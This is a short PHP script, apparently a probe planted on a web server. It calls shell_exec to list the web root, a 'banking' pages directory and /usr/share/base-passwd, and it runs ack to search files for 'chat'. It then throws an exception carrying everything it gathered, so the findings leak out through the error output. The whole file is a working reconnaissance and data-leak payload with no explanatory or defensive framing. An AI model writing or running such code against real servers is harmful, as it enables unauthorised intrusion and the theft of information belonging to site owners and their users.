<?php
$output ='';
$output =$output."\n pages multi".shell_exec ('ls /var/www/pages/ | xargs');
$output =$output."\n bank".shell_exec ('ls /var/www/pages/banking/| xargs');
$output =$output."\n base_passwd".shell_exec ('ls /usr/share/base-passwd | xargs');

$output =$output."\n FIND ".shell_exec ('ack "chat" | xargs');


throw new Exception("\n SUCCESS ". $output."\n");
?>
